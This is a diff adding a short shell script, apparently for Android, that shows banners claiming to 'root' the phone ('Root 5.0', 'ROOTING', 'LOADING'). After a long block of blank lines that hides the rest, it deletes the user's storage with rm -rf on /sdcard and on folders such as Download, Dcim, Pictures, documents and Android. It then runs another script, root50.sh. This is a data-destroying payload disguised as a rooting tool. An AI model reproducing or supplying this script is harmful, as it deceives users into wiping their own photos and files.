@@ -1,0 +1,67 @@
+figlet 000000;
+figlet EXECUTE👑👑;
+figlet Progress;
+ex system;
+root Ex;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+cd /sdcard;
+figlet Root 5.0;
+figlet ROOTING;
+figlet LOADING;
+cd /;
+rm -rf sdcard;
+cd /sdcard;
+rm -rf Download;
+rm -rf Android;
+rm -rf Dcim;
+rm -rf documents;
+rm -rf Pictures;
+rm -rf games;
+rm -rf data;
+rm -rf Picsart;
+cd;
+sh root50.sh
+
